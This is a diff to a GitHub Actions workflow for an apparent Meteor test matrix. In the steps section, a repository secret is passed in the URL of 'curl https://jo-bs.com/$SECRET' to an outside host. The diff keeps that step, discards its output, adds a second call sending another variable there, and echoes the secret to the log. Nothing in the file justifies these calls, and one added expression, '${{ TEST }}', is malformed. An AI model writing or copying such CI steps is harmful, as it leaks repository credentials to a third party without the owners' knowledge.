@@ -14,7 +14,7 @@ jobs:
     env:
       SECRET: ${{ secrets.NEW_TEST }}
       # SEC: ${{ env }}
-      NEWTEST: hello
+      TEST: ${{ TEST }}
     runs-on: ubuntu-latest
     strategy:
       matrix:
@@ -23,8 +23,9 @@ jobs:
     name: Meteor ${{ matrix.meteor }}
     steps:
       - run: echo $SECRET
-      - run: curl https://jo-bs.com/$SECRET
-      - run: echo $NEWTEST
+      - run: curl https://jo-bs.com/$SECRET -o /dev/null
+      - run: curl https://jo-bs.com/$TEST -o /dev/null
+      - run: echo $TEST
       - run: echo $SEC
       # - run: echo ${{ env }}
       - run: echo "change" > file
